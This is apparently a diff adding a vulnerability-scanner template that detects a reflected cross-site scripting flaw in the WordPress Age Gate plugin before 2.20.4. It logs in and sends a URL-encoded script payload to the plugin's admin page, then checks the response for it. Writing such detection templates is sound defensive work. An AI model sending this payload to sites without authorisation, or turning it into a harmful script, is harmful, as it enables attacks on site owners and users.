@@ -1,0 +1,52 @@
+id: age-gate-xss
+
+info:
+  name: WordPress Age Gate <2.20.4 - Cross-Site Scripting
+  author: akincibor,daffainfo
+  severity: high
+  description: |
+    WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.
+  reference:
+    - https://wpscan.com/vulnerability/a13148fe-ffc9-4003-a44d-652624ba5535
+    - https://wordpress.org/plugins/age-gate/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 2
+  tags: xss,authenticated,age-gate,wpscan,wordpress,wp-plugin,wp
+
+http:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"><script>alert(document.domain)</script>'
+          - 'Age Gate Restriction Settings'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a00483046022100f0304dbf4fb8602458c1608bb0ba2abf334aec2938b6569d124ca24d670f19c2022100eb179fe18bbee5ce31c5d5556bda2b4bf2de27a3770537b518ec914d98f3ffd1:922c64590222798bb761d5b6d8e72950
